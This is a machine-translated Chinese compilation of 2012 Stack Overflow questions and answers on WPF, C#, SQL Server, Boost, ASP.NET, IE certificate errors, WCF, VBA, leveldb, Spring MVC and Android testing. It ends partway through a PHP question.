<TextBox Text="{Binding NewRateAdjustment.Amount, Mode=TwoWay, NotifyOnValidationError=True, ValidatesOnDataErrors=True,ValidatesOnExceptions=True}" Style="{StaticResource SurchargeAmountTextBox}" AttachedProperties:TextRules.TextRule ="{StaticResource numericRule}">
    <i:Interaction.Behaviors>
        <gl:NumericTextBoxBehavior DecimalLimit="2" />
    </i:Interaction.Behaviors>
</TextBox> 
```

现在，我需要根据页面下拉菜单中的选择更改 DecimalLimit，因此我创建了此样式。

```
<Style x:Key="SurchargeAmountTextBox" TargetType="{x:Type TextBox}" BasedOn="{StaticResource DefaultTextBox}">
    <Style.Triggers>
        <DataTrigger Binding="{Binding Path=NewRateAdjustment.SelectedRateAdjustment.CalculationMethod.Name, UpdateSourceTrigger=PropertyChanged}" Value="Fuel">
            <Setter Property="Background" Value="Red"/>
        </DataTrigger>
        <DataTrigger Binding="{Binding Path=NewRateAdjustment.SelectedRateAdjustment.CalculationMethod.Name, UpdateSourceTrigger=PropertyChanged}" Value="">
            <Setter Property="Background" Value="Green"/>
        </DataTrigger>
    </Style.Triggers>
</Style> 
```

它似乎适用于颜色。但是如何为 DecimalLimit 编写属性设置器？？？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T15:56:41.450

您不能通过样式更改行为属性，但您可以尝试通过样式**应用**行为。该主题已在其他问题中中止，例如[this](https://stackoverflow.com/questions/1647815/how-to-add-a-blend-behavior-in-a-style-setter)，但在您的特定情况下，您不仅希望通过样式应用行为，还希望根据数据以不同的配置应用它。在以下方法中，我将使用附加属性来完成此操作。首先，类似于您正在使用的虚拟行为：

```
public class NumericTextBoxBehavior : Behavior<TextBox>
{
    public double DecimalLimit { get; set; }

    protected override void OnAttached()
    {
        base.OnAttached();

        // Dummy action so we can see the change when its applied
        this.AssociatedObject.Text = this.DecimalLimit.ToString();
    }
} 
```

现在我们创建一个附加属性，它将负责应用行为（您可以在另一个类中执行此操作，或者如果您可以访问它，则在行为类中执行此操作）：

```
public static class NumericTextBoxBehaviorExtension
{
    public static double? GetDecimalLimit(DependencyObject obj)
    {
        return (double?)obj.GetValue(DecimalLimitProperty);
    }
    public static void SetDecimalLimit(DependencyObject obj, double? value)
    {
        obj.SetValue(DecimalLimitProperty, value);
    }
    public static readonly DependencyProperty DecimalLimitProperty =
        DependencyProperty.RegisterAttached("DecimalLimit", typeof(double?), typeof(NumericTextBoxBehaviorExtension), new PropertyMetadata(null, OnDecimalLimitChanged));

    private static void OnDecimalLimitChanged(DependencyObject sender, DependencyPropertyChangedEventArgs args)
    {
        var behaviors = Interaction.GetBehaviors(sender);

        // Remove the existing behavior instances
        foreach (var old in behaviors.OfType<NumericTextBoxBehavior>().ToArray())
            behaviors.Remove(old);

        if (args.NewValue != null)
        {
            // Creates a new behavior and attaches to the target
            var behavior = new NumericTextBoxBehavior { DecimalLimit = (double)args.NewValue };

            // Apply the behavior
            behaviors.Add(behavior);
        }
    }
} 
```

最后，以下测试用例将模拟您的场景。我们有一个 TextBox 样式，它将根据 TextBox 的 DataContext 的状态应用不同的 DecimalLimit。xml:

```
<Window x:Class="WpfApplication1.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:local="clr-namespace:WpfApplication1"
    Title="MainWindow" Height="350" Width="525">
<Window.Resources>
    <Style x:Key="TextBoxStyle" TargetType="TextBox">
        <Style.Triggers>
            <DataTrigger Binding="{Binding Name}" Value="Fuel">
                <Setter Property="local:NumericTextBoxBehaviorExtension.DecimalLimit" Value="10.0"/>
            </DataTrigger>
            <DataTrigger Binding="{Binding Name}" Value="">
                <Setter Property="local:NumericTextBoxBehaviorExtension.DecimalLimit" Value="1000.0"/>
            </DataTrigger>
        </Style.Triggers>
    </Style>
</Window.Resources>
<Grid>
    <Button Content="Button" Height="23" HorizontalAlignment="Left" Name="button1" VerticalAlignment="Top" Width="75" Click="button1_Click" />
    <TextBox Height="23" HorizontalAlignment="Left" Margin="81,1,0,0" Name="textBox1" VerticalAlignment="Top" Width="120" Style="{StaticResource TextBoxStyle}"/>
</Grid> 
```

在后面的代码中，我们将让按钮的动作交换 TextBox 的 DataContext 以验证样式是否会正确更新行为：

```
public partial class MainWindow : Window
{
    public MainWindow()
    {
        InitializeComponent();
    }

    private void button1_Click(object sender, RoutedEventArgs e)
    {
        var target = this.textBox1.DataContext as Target;
        if (this.textBox1.DataContext == null || string.IsNullOrEmpty(target.Name))
        {
            this.textBox1.DataContext = new Target() { Name = "Fuel" };
        }
        else
        {
            this.textBox1.DataContext = new Target() { Name = "" };
        }
    }
} 
```

如您所见，每次我们交换 DataContext 时，TextBox 的 Text 都会发生变化，这意味着样式确实应用了正确的行为。

# c# - 适应构造函数注入 - 如何从参数到工厂？

> ID：13418907
> 
> 赞同：0
> 
> 时间：2012-11-16T14:48:45.463
> 
> 标签：c#, dependency-injection

如何调整现有的表单类：

```
public class A
{
    A(IDependency1 obj1, IDependency2 obj2)
    {
      // ...
    }
} 
```

变成这样：

```
public class A
{
    private List<IDependency2> _things;

    A(IDependency1 obj1)
    {
        _things = new List<IDependency2>();
        foreach (var x in someCollection)
            _things.Add(NewInstanceOf<IDependency2>());
    }
} 
```

关键是在第一个例子`obj2`中是一个单例实例`IDependency2`。在第二个示例中，创建了不可预测数量的实例`IDependency2`。

我曾考虑`Func<IDependency2>`在构造函数中有一个参数，但我与一位建议我使用的熟人讨论了这个，`IDependencyResolver`因为它会更明确。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:56:35.977

在 DI 中，接口充当关于依赖项的合同。正如你所说，将会存在

> IDependency2 的实例数量不可预测

对于任何类型的注入集合，这都为我尖叫

例子：

```
interface IDependency2List
{
    IEnumerable<IDependency2> Items;
}
interface IDependency2
{
    //bla
}
public class A
{
    public A(IDependency1 dep1, IDependency2List dep2List)
    {

    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T18:59:45.407

您可以添加一个工厂接口，如：

```
public interface IDependencyFactory<T> where T : class, new()
{
    T Create();
} 
```

还有一个简单的实现：

```
public class SimpleDependencyFactory<T> where T : class, new()
{
    public T Create()
    {
        return new T();
    }
} 
```

然后您的类构造函数将工厂作为参数：

```
public class A
{
    private List<IDependency2> _things;

    public A(IDependency1 obj1, IDependencyFactory<IDependency2> dep2Factory)
    {
        _things = new List<IDependency2>();
        foreach (var x in someCollection)
            _things.Add(dep2Factory.Create());

    }
} 
```

这不会编译，因为`someCollection`。您的示例中也从未使用过 obj1 。我不知道你为什么首先添加它。请注意，工厂的强大之处在于您可以添加更复杂的实现，而不仅仅是使用无参数构造函数创建对象。寻找不同的工厂模式。流行的是工厂方法和抽象工厂。

# sql-server - WHERE 子句中的 SQL 查询依赖逻辑

> ID：13418912
> 
> 赞同：1
> 
> 时间：2012-11-16T14:49:07.197
> 
> 标签：sql-server, sql-server-2008, tsql, stored-procedures

我有一张桌子`TableX`。它包含三列：`A` `INT`和`B` `INT`（`C` `VARCHAR(1)`列 C 的有效值是列“A”或“B”的名称）。我需要计算满足以下任一条件的出现次数：

1.  当`C`is`NULL`和*does*包含大于`A`或等于零的值。`B`或者
2.  何时`C`为`NOT NULL`（即“A”或“B”）且指定列（`A`或`B`）中的值为零或`NULL`。

我当前的存储过程看起来像

```
CREATE PROCEDURE ispcSomeName @NumOcc INT OUTPUT 
AS
SELECT COUNT(*) AS [NumOcc] 
FROM TableName 
WHERE (C IS NULL 
       AND ((A IS NOT NULL OR A > 0) OR 
            (B IS NOT NULL OR B > 0))) 
    OR (CritCarType IS NOT NULL 
        AND (CASE SET @TmpColumnName = CritCareType 
                 WHEN N'A' THEN (A IS NULL OR A <= 0) 
                 WHEN N'B' THEN (B IS NULL OR B <= 0)))
GO 
```

问题是我需要检查`C`引用的列。即如果`C = 'A'`，我需要检查是否`A IS NOT NULL OR A <= 0`。`SET`决赛中的明显有问题`WHERE`。我已经编写了一些此类 SP，如果我能提供帮助，我想避免使用复杂的 TSQL...

**如何动态获取对子`WHERE`句中相关列的引用？**

谢谢你的时间。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T15:11:42.650

```
Select Count(*)
from tab
where 
(
    C is null and (Coalesce(A,0)>0 or Coalesce(B,0)>0)
)
or 
(
    C is not null and Case when C='A' then Coalesce(A,0) 
    when C='B' then Coalesce(B,0) end <=0
) 
```

# c++ - 使用 Boost unordered_map

> ID：13418918
> 
> 赞同：3
> 
> 时间：2012-11-16T14:49:20.567
> 
> 标签：c++, boost, unordered-map

我想`boost::unordered_map`在不下载整个 Boost 包的情况下包含在我的项目中。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-16T20:32:16.047

使用`bcp`： http: [//www.boost.org/doc/libs/1_52_0/tools/bcp/doc/html/index.html](http://www.boost.org/doc/libs/1_52_0/tools/bcp/doc/html/index.html)

```
cd $BOOST_DIR
bcp unordered_map /tmp/TEST 
```

现在 /tmp/TEST***仅***包含所需的东西`unordered_map`，在我的情况下为 15Mb（而不是完整的 boost 库的 734Mb）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T15:36:37.270

您至少需要标头，因为 Boost 包相互依赖。您可能只想选择需要的头文件，但这确实会让人头疼，并且会花费您很多时间。算法是：

1.  仅包括`boost/unordered_map`.
2.  虽然预处理器抱怨找不到标头：
    *   添加该标题。
    *   重新编译。

您最终只会得到必要的标题。但我看不出这个解决方案有什么好处。

# asp.net - asp.net 菜单控制适配器禁用 javascript

> ID：13418921
> 
> 赞同：0
> 
> 时间：2012-11-16T14:49:30.940
> 
> 标签：asp.net, control-adapter

您好我正在尝试为菜单控件编写一个控制适配器。但是我如何阻止它加载 javascript？

它呈现以下行`new Sys.WebForms.Menu({ element: 'menu1', disappearAfter: 500, orientation: 'vertical', tabIndex: 0, disabled: false });`我找不到阻止它的方法..

```
Public Class MenuAdapter
    Inherits WebControlAdapter

    Private ReadOnly Property Menu As Menu
        Get
            Return CType(MyBase.Control, Menu)
        End Get
    End Property

    Protected Overrides Sub RenderBeginTag(writer As System.Web.UI.HtmlTextWriter)
        If (Not String.IsNullOrEmpty(Control.ClientID)) Then
            writer.AddAttribute(HtmlTextWriterAttribute.Id, Control.ClientID)
        End If
        If (Not String.IsNullOrEmpty(Control.CssClass)) Then
            writer.AddAttribute(HtmlTextWriterAttribute.Class, Control.CssClass)
        End If
        writer.RenderBeginTag(HtmlTextWriterTag.Ul)

    End Sub

    Protected Overrides Sub RenderEndTag(writer As System.Web.UI.HtmlTextWriter)
        writer.WriteLine()
        writer.RenderEndTag()
    End Sub

    Protected Overrides Sub RenderContents(writer As System.Web.UI.HtmlTextWriter)
        RenderItems(writer, Menu.Items)
    End Sub

    Private Sub RenderItems(writer As System.Web.UI.HtmlTextWriter, menuItems As MenuItemCollection)
        For Each menuItem As MenuItem In Menu.Items
            If (HttpContext.Current.Server.MapPath(menuItem.NavigateUrl).Equals(HttpContext.Current.Request.PhysicalPath, StringComparison.OrdinalIgnoreCase)) Then
                writer.AddAttribute("class", Menu.StaticSelectedStyle.CssClass)
            End If
            writer.RenderBeginTag(HtmlTextWriterTag.Li)
            If (Not String.IsNullOrEmpty(menuItem.NavigateUrl)) Then
                writer.AddAttribute(HtmlTextWriterAttribute.Href, Menu.ResolveClientUrl(menuItem.NavigateUrl))
                writer.RenderBeginTag(HtmlTextWriterTag.A)
                writer.Write(menuItem.Text)
                writer.RenderEndTag()
            Else
                writer.Write(menuItem.Text)
            End If
            If (menuItem.ChildItems.Count > 0) Then
                RenderBeginTag(writer)
                RenderItems(writer, menuItem.ChildItems)
                RenderEndTag(writer)
            End If
            writer.RenderEndTag()
        Next
    End Sub

End Class 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T11:59:01.027

覆盖 OnPreRender 并且不调用基本方法似乎可以解决问题。

# internet-explorer - 无法使用 https 和自签名证书通过 IE 访问我的本地站点

> ID：13418923
> 
> 赞同：1
> 
> 时间：2012-11-16T14:49:41.563
> 
> 标签：internet-explorer, ssl, https, internet-explorer-9, internet-explorer-10

我有一个 Web 应用程序和自签名证书。当我使用 Chrome/Firefox 时，'https://localhost:443/mysite/' 工作正常。但在 IE9 中我无法访问我的网站。

有一个按钮“继续访问此网站（不推荐）”根本不起作用！我应该怎么做才能同时在 https 和 IE9 上测试我的网站？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-28T13:26:38.243

我一直在网上看到这与 Windows 更新有关，该更新限制了使用少于 1024 位密钥的 RSA 证书的访问。“首选”解决方案是使用更强的密钥。

[http://support.microsoft.com/kb/2661254](http://support.microsoft.com/kb/2661254)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T17:19:04.193

在 IE 中，转到工具 > Internet 选项 > 安全 > 受信任的站点 > 站点，然后单击添加以将站点 URL 添加为受信任。

返回网站 - 您可能仍会收到自签名警告。点击继续访问网站。然后在页面上右键单击并选择属性，然后选择证书将证书添加到受信任的根证书颁发机构。

很确定就是这样（从记忆中）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-19T08:41:34.470

我已将密钥算法从 RSA 更改为 DSA，并且一切正常。谢谢大家。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-03T18:57:59.903

在尝试了许多解决此问题的建议后，手动创建快捷方式就可以了。我不明白原因，但它奏效了，所以我很高兴。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-04-11T12:13:03.237

似乎在 IE 和 Safari 中使用`//127.0.0.1`而不是`//localhost`- 为我工作是一个好主意，但有类似的问题。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2013-08-17T01:40:11.210

所以，它对我不起作用。

我的问题是，我试图访问本地服务器 ( `https://192.168.1.1:8773/userinterface.jsp`) 上的 Web 界面，而 IE10 中的唯一选项是关闭网页。（在铬中工作正常）

尝试了几种解决方案并发现了这一点：

由 IE 创建的新 .website 快捷方式（在我的例子中是通过将 URL 图标拖到桌面上）完全是垃圾。

解决方案：

删除所有使用 Internet Explorer 创建的网站快捷方式并创建您自己的快捷方式：

右键单击您的桌面并选择“新建快捷方式” 输入目标 URL，例如[http://www.google.de](http://www.google.de) 输入链接名称 单击“确定”完成向导。

奇迹般有效。当您查看快捷方式的文件属性时，请确保您没有 .website 扩展名。

# google-custom-search - Google 自定义搜索框 - 自动填充

> ID：13418930
> 
> 赞同：1
> 
> 时间：2012-11-16T14:49:55.400
> 
> 标签：google-custom-search

我正在使用以下表单在我的页面上实现 Google 自定义搜索框：

```
`<form id="cse-search-box" action="http://www.myurl.com">
<input type="hidden" name="cx" value="XXXXXXXXXXXXXXXXXXXXXXX"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" etc etc.....
</form>` 
```

如何在上面的示例中启用自动完成功能？

干杯

# wcf - wcf httpbinding 的连接池

> ID：13418933
> 
> 赞同：2
> 
> 时间：2012-11-16T14:50:04.807
> 
> 标签：wcf, http

对于基于 http 的 wcf 服务，是否有任何内部发生的连接池？是否会为每个 http 请求打开和关闭连接？通过一些搜索，我找到了一个叫做`keep-alive`设置的东西，但并没有真正理解它在 wcf 场景中是如何工作的。是否可以为`httpbinding`服务实现连接池。下面是我们的用例。

最终客户端系统是使用我们开发的 wcf 服务的 informatica。我们的 wcf 服务又调用另一个外部 Web 服务（我不确定它是 wcf 实现的服务还是在另一个不同的平台上，不确定是否有除了询问供应商之外的动态检测方法）。

我们将在一段时间内对外部服务进行数千次调用，并希望对其进行优化。在一次调用中发送大量数据还不是供应商服务提供的选项。

我认为打开/关闭连接会产生很多开销。有没有办法将连接重新用于基于 http 的服务？

谢谢， 希亚姆

# asp.net - 组织主从控制器 ASP.Net Web API

> ID：13418934
> 
> 赞同：3
> 
> 时间：2012-11-16T14:50:05.160
> 
> 标签：asp.net, asp.net-web-api

我正在尝试确定基于主 ID 实现详细记录检索的最佳方法。

显然，您将为 master 和 detail 设置 API 控制器。

我考虑过的解决方案：

*   让 API 使用者使用 OData 获取由主 ID 过滤的所有详细信息。虽然我对这个解决方案没有意见，但我觉得把它放在 API 使用者身上有点不好，我觉得它应该由 API 在内部处理
*   违反仅具有 Get/Put/Post/Delete 方法的约定，并在细节控制器上创建“GetMastersDetails”操作并使其可通过路由访问。虽然这肯定会奏效，但我觉得这偏离了 Web API 的全部意义（在一定程度上）。
*   创建一个名为“MastersDetailsController”的第三个控制器，该控制器将具有基于具有不同可能返回类型的主 ID 的 Get：
    *   这将返回详细信息 ID 列表，然后将用于调用详细信息控制器上的 Get 以获取这些实际详细信息
    *   这将返回一个实际细节对象的列表。我不喜欢的是控制器返回的类型与其所基于的类型不同。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T06:14:12.530

我会选择＃1或＃2。

对于 #1，OData 支持不仅支持您描述的场景，而且还提供了许多未来可能需要的附加功能。

对于#2，我认为它不会脱离 Web API 的重点。也许有点来自真正的 RESTful 服务，但它易于实现且易于理解。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-20T16:32:19.837

选项2会很好。选项 1 会带来更多风险，具体取决于您的场景以及您希望允许用户获得的内容。

将自定义方法添加到 ApiController 并不是真正的“违反约定”。你可以随心所欲地这样做。如果您这样做并使用了错误的 HTTP 方法（即，当您在自定义方法中删除某些内容时使用 GET），则只会“违反约定”。

# excel-2010 - VBA 运行时错误“13”类型不匹配

> ID：13418935
> 
> 赞同：1
> 
> 时间：2012-11-16T14:50:06.383
> 
> 标签：excel-2010

我们最近使用 Office 2010 更新到 Windows 7，现在我们的一些 Excel 宏无法正常工作。下面是一个示例代码，我收到运行时错误“13”，但找不到类型不匹配的位置。

```
Private Sub btnUpdate_Click()

Dim lngLastRow As Long
Dim arrRevSource(0 To 9) As Long

Dim i As Integer

lngLastRow = Sheets("Test Log").Range("A1").End(xlDown).Row

For i = 2 To lngLastRow

If Sheets("Test Log").Cells(i, 7).Value <> "incl." And Sheets("Test Log").Cells(i,    7).Value <> "" And Sheets("Test Log").Cells(i, 7).Value <> "VOID" Then 'protect from  entries other than numbers

    Select Case Sheets("Test Log").Cells(i, 9).Value
        Case "A033", "A034", "A225", "A226" 'Cap2000
            arrRevSource(0) = arrRevSource(0) + Sheets("Test Log").Cells(i, 7).Value

          Case "0611", "0612", "0620", "0621", "0622", "0623", "0815", "0816", "0818", "0819", "0820", "0821" 'EVAP Development
            arrRevSource(1) = arrRevSource(1) + Sheets("Test Log").Cells(i, 7).Value

        Case "A084", "A173", "A220", "A224", "A290", "A294", "A301" 'Cert
            arrRevSource(2) = arrRevSource(2) + Sheets("Test Log").Cells(i, 7).Value

        Case "0792", "0794" 'Diesel In Use Enforcement
             arrRevSource(3) = arrRevSource(3) + Sheets("Test Log").Cells(i, 7).Value

        Case "0608", "0654" 'AMG
            arrRevSource(4) = arrRevSource(4) + Sheets("Test Log").Cells(i, 7).Value

        Case "0588" 'G Class Development
            arrRevSource(5) = arrRevSource(5) + Sheets("Test Log").Cells(i, 7).Value

          Case "0543", "0545", "0547", "0548", "A009", "A093", "A252", "A295", "A296" 'Third Party"

            arrRevSource(6) = arrRevSource(6) + Sheets("Test Log").Cells(i, 7).Value

       Case "A002", "A237" 'OBD
           arrRevSource(7) = arrRevSource(7) + Sheets("Test Log").Cells(i, 7).Value

       Case "A268" 'FETS
           arrRevSource(8) = arrRevSource(8) + Sheets("Test Log").Cells(i, 7).Value

           'For All Other Sources of Revenue
       Case "A074", "A109", "A168", "A185", "A199", "A208", "A217", "A239", "A270", "0666", "0669" 'Other
            arrRevSource(9) = arrRevSource(9) + Sheets("Test Log").Cells(i, 7).Value

        'Case Else 'Other
            'arrRevSource(9) = arrRevSource(9) + Sheets("Test Log").Cells(i, 7).Value

    End Select

End If

Next

For i = 1 To 10

    Sheets("Revenue Sources").Cells(3, i + 1).Value = arrRevSource(i - 1)

Next

End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T19:27:25.873

我不确定这是否能解决你所有的问题，但我肯定会改变它：

```
Dim i as integer 'should be as long!

For i = 2 To lngLastRow 
```

我会说你的 IF-Protection against non-numbers 不能正常工作，或者我误解了一些东西。您可能想尝试使用此行进行选择：

```
Select Case CStr(Sheets("Test Log").Cells(i, 9).Value) 
```

# git - 如何根据当前机器上可用的内容自动配置 git 合并工具？

> ID：13418938
> 
> 赞同：1
> 
> 时间：2012-11-16T14:50:21.530
> 
> 标签：git, bash

我正在使用许多系统，至少在其中一些系统上，我的主目录存储在 NIS 上，所以我确实共享相同的偏好。

我确实想编写一个小的 bash 脚本，我可以将其包含在`~/.bash_profile`其中，它将配置已安装在当前机器上的最佳 diff 工具。

规则很简单，我必须检查哪些命令行 diff 工具可用并配置 git 以使用我找到的第一个。

旁注：在一台 linux 机器上，我发现有 ENV 变量`__git_mergetools_common=$'diffuse ecmerge emerge kdiff3 meld opendiff\n\t\t\ttkdiff vimdiff gvimdiff xxdiff araxis p4merge\n'`——我不知道它是做什么用的，但它看起来很有趣。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:55:19.630

可能最简单的答案是编写一个作为 diff 程序运行的 bash 脚本，并且每次都选择最佳可用的实际 diff 程序。

# c# - 从正在等待的事件返回反馈

> ID：13418941
> 
> 赞同：2
> 
> 时间：2012-11-16T14:50:27.613
> 
> 标签：c#, events, .net-3.5, event-handling

简单来说，我想做的是通过在单独的线程上启动一个进程来做我需要做的事情并等待一个事件被提出来说“我已经完成了我需要做的事情”来处理“做某事”做”。尽管如此，`EventArgs`我将拥有一个属性，用于处理过程中可能遇到的任何错误。这是我的情况的简化示例。

```
public class MessageHandler
{
  private AutoResetEvent MessageHasSent = new AutoResetEvent(false);
  public void SendMessage()
  {
    MessageSender ms = new MessageSender();
    ms.MessageSent += new EventHandler<MessageSentEventArgs>(MessageHandler_MessageSent);

    Thread t = new Thread(ms.Send());
    t.Start();

    MessageHasSent.WaitOne();
    //Do some check here

    //Same again but for "Message recieved"
  }
  void MessageHandler_MessageSent(object sender, MessageSentEventArgs e)
  {
    if (e.Errors.Count != 0)
    {
      //What can I do here to return to the next step after waitone?
    }
    else
      MessageHasSent.Set();
  }
}
public class MessageSender
{
  public event EventHandler<MessageSentEventArgs> MessageSent;
  public void Send()
  {
    //Do some method which could potentiallialy return a List<Error>
    MessageSent(this, new MessageSentEventArgs() { Errors = new List<Error>() });
  }
}
public class Error { }
public class MessageSentEventArgs : EventArgs
{
  public List<Error> Errors;
} 
```

基本上，一旦从`Send`代码中引发了事件，就会继续，但是我想要某种方式的事件提供反馈，可能使用`MessageHasSent`. 我尝试了不同的方法，我想如果我调用`Close`而不是调用`Set`它可能会允许我访问诸如`IsClosed`. 您可以`throw an exception`或在事件范围之外设置一个标志来检查，但我觉得这很脏。

有什么建议么？

`TPL`由于我使用的是 .NET 3.5，因此在我的情况下不适用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T15:21:58.077

由于这部分代码似乎已经在后台线程中运行，而您只是启动一个新线程以便等待它完成，因此最好`Send`直接调用，而不是异步的。

*   完成后，您无需触发事件。

*   当它需要继续时，您不需要向主线程发出信号。

*   您不需要在 a 中记录异常`List`，您可以将它们抛出并`SendMessage`使用 try/catch 块捕获它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T15:10:31.873

这将做你想要的：

```
public class MessageHandler
{
    private AutoResetEvent MessageHasSent = new AutoResetEvent(false);
    private bool IsSuccess = false;
    public void SendMessage()
    {
        MessageSender ms = new MessageSender();
        ms.MessageSent += new EventHandler<MessageSentEventArgs>(MessageHandler_MessageSent);

        Thread t = new Thread(ms.Send());
        t.Start();

        MessageHasSent.WaitOne();
        if(IsSuccess)
            //wohooo
        else
            //oh crap

        //Same again but for "Message recieved"
    }
    void MessageHandler_MessageSent(object sender, MessageSentEventArgs e)
    {
        IsSuccess = e.Errors.Count == 0;
        MessageHasSent.Set();
    }
}
public class MessageSender
{
    public event EventHandler<MessageSentEventArgs> MessageSent;
    public void Send()
    {
        //Do some method which could potentiallialy return a List<Error>
        MessageSent(this, new MessageSentEventArgs() { Errors = new List<Error>() });
    }
}
public class Error { }
public class MessageSentEventArgs : EventArgs
{
    public List<Error> Errors;
} 
```

# database - 如何快速获取 leveldb 中的确切键数？

> ID：13418942
> 
> 赞同：14
> 
> 时间：2012-11-16T14:50:29.063
> 
> 标签：database, count, nosql, key, leveldb

好像没有这个界面。。

我是否必须迭代所有键才能获得计数？

这样做的设计目的是什么？或者实现此功能的限制是什么？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-11T09:04:42.350

*“没有办法在 leveldb 内部比外部更有效地实现 Count。”* 国家官方[问题 113](http://code.google.com/p/leveldb/issues/detail?id=113)

似乎没有更好的方法可以做到这一点，除了**遍历整个数据集**或实现您自己的应用程序**内写入计数器**。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T19:47:31.620

可能在构建 LevelDB 时，原始作者不需要此 API。遗憾的是，LevelDB 没有可用于记录计数的增量 API。您现在可以做的是在 Leveldb 中读取和写入密钥，但这不是线程安全的。

如果 Redis 更适合您的用例，您可能可以看看它。

# spring-mvc - spring mvc项目布局

> ID：13418945
> 
> 赞同：3
> 
> 时间：2012-11-16T14:50:46.583
> 
> 标签：spring-mvc

![在此处输入图像描述](../Images/293b65d50363937b681a874a8d28a2bb.png)[当前项目结构](https://i.stack.imgur.com/1Wcm7.jpg)

在我的第一个 spring mvc 项目中，我试图更好地理解这个项目的目录结构以及为什么这样做

我得到了“控制器”和“视图”目录中的内容，但不确定其他内容。如果我查看 bean 和命令中的 .java 文件，它们对我来说看起来是一样的——两者之间的注释没有区别，那么为什么不能将 2 个目录合并为一个呢？

什么进入服务？

映射器看起来像是用于与 OR/M 对象的数据库进行映射

不确定解析器目录

这是组织spring mvc项目的标准方式吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T15:06:54.760

每个项目根据组织/用户的风格都有其结构。结构遵守组织制定的标准。所以它们因人而异。一个 MVC 项目可以大致分为

1.  控制器
2.  services //业务逻辑层。控制器和 dao 之间的层
3.  dao // 与 DB 通信
4.  command 或 bo 或 vo（任何适合您的名称）

以上是主要的三个。然后可能还有其他文件夹，例如

1.  utils //转换器、验证器等可以放在这里或放在他们自己的包中
2.  resources // 将您的 .properties、xmls 等放在这里

在spring的上下文中，任何标有继承自注释的类`@Component`都是一个bean，因此您在问题中提到的结构可以牢记这一点，但没有正确使用。

resolvers 文件夹可能托管 View Resolvers。这再次只是一个猜测。完全取决于你。

您可以查看 maven 的 spring 原型及其组织 spring 项目的方式，以了解 Spring 的创建者如何组织项目。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-01-14T05:50:27.400

**Spring-Hibernate 项目根据组织标准遵循不同的项目结构。一个 Spring MVC 项目大致可以分为以下几类：**

```
   -java资源
        |_src
           |-com.organization.controllers // 所有的控制器
                     |_ 用户控制器
                     |_ Abc控制器
                     |_ -------------
                     |_ Xyz控制器

           |-com.organization.services //服务层或业务层
                     |_ AbcService
                     |_ AbcServiceImpl

           |-com.organization.dao //数据访问层
                     |_ ABC道
                     |_ AbcDaoImpl

           |-com.organization.bo // POJO 或业务对象层
                     |_ 用户
                     |_ 美国广播公司

           |-resources // 所有资源

           |-util // 实用程序

   -网页内容
           |-资源
                    |_css
                    |_js
                    |_图片
           |-WEB-INF
                    |_lib
                    |_views
                          |_ .jsp
                    |_.xml

           |-index.jsp

```

# android - 使用 AsyncTask 和 UI 更新解决方案的 Android 单元测试

> ID：13418947
> 
> 赞同：6
> 
> 时间：2012-11-16T14:50:53.557
> 
> 标签：android, unit-testing, ui-thread

设想：

我正在尝试对我的应用程序的 onClick 处理程序进行单元测试。Onclick 对 REST API 进行简单搜索，返回结果并更新 UI。

细节：

Onclick 执行一个 AsyncTask，doInBackground 查询 REST API 并返回结果。onPostExecute 获取结果并将新的 ListAdapter 分配给带有数据的 ListView。

问题：

onPostExecute 不会被 Test Runner 调用，因为它位于同一个 UI 线程上并阻止调用。有几种模式可以处理这个问题。但是，如果我将 AsyncTask 放在 Runnable 中并使用 LatchCountdown 等待结果，则会收到 CalledFromWrongThread 异常。

是否有一个很好的解决方案来对进行 UI 更新的 AsyncTask 进行单元测试？还是我可以实现的更可测试的设计？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:56:35.083

您想在[Ui 线程上运行测试](http://developer.android.com/reference/android/app/Activity.html#runOnUiThread%28java.lang.Runnable%29)

```
runOnUiThread(new Runnable() {
   public void run() {
      onPostExecute(...)

  }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T19:30:45.063

好的，所以我想出的解决方案是这样的：

1.) 为前后事件定义一个监听器接口。
2.) 在 Activity 上实现监听
器 2.) 定义一个任务包装类，该类接受一个监听器并且有一个在“exec”上调用的内部 AsyncTask。
3.) 内部 AsyncTask 在 onPreExecute 和 onPostExecute 上通知侦听器
4.) 收到通知后，Activity 更新它的 UI。

在 Activity 中进行测试：
1.) 通过继承它来创建包装类的串行版本，然后覆盖 exec 方法以按顺序执行：
- 通知侦听器任务已启动。
- 执行任务。
- 通知侦听器任务完成。

用于测试任务的异步版本。
1.) 在单元测试方法中使用 CountdownLatch 和 Runnable。由于不需要任何 UI 更新，因此不会有任何 WrongThreadExceptions。

# php - 在扩展类中使用父变量的问题

> ID：13418951
> 
> 赞同：-1
> 
> 时间：2012-11-16T14:51:10.150
> 
> 标签：php

我需要将在父类中找到的变量传递给扩展类，但我得到的只是变量未定义的通知。

我不确定出了什么问题，我的直觉说这很容易解决，但由于某种原因我看不到它。

```
